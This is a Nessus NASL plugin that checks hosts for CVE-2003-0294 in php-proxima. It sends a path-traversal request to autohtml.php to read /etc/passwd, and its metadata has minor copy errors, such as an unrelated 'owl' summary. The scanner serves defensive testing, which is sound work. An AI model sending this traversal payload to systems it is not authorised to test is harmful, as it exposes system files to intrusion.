#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  From: "Mind Warper" <mindwarper@linuxmail.org>
#  To: bugtraq@securityfocus.com
#  Date: Thu, 15 May 2003 01:43:40 +0800
#  Subject: php-proxima Remote File Access Vulnerability



include("compat.inc");

if (description)
{
 script_id(11630);
 script_version ("$Revision: 1.9 $");
 script_cve_id("CVE-2003-0294");
 script_xref(name:"OSVDB", value:"9028");

 script_name(english:"php-proxima autohtml.php Arbitrary File Retrieval");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files can be run on the remote server." );
 script_set_attribute(attribute:"description", value:
"The remote host is running php-proxima, a website portal.

There is a flaw in this version which allows an attacker to read 
arbitrary files on the remote host." );
 script_set_attribute(attribute:"solution", value:
"None at this time - disable this CGI." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );


script_end_attributes();

 script_summary(english:"Determines owl is installed");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_dependencie("webmirror.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

if(!can_host_php(port:port)) exit(0);


foreach d (cgi_dirs())
{
 r = http_send_recv3(method: "GET", item:d + "/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd", port:port);
 if (isnull(r)) exit(0);
 res = strcat(r[0], r[1], '\r\n', r[2]);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:res))
 	{
    	security_warning(port);
	exit(0);
	}
}
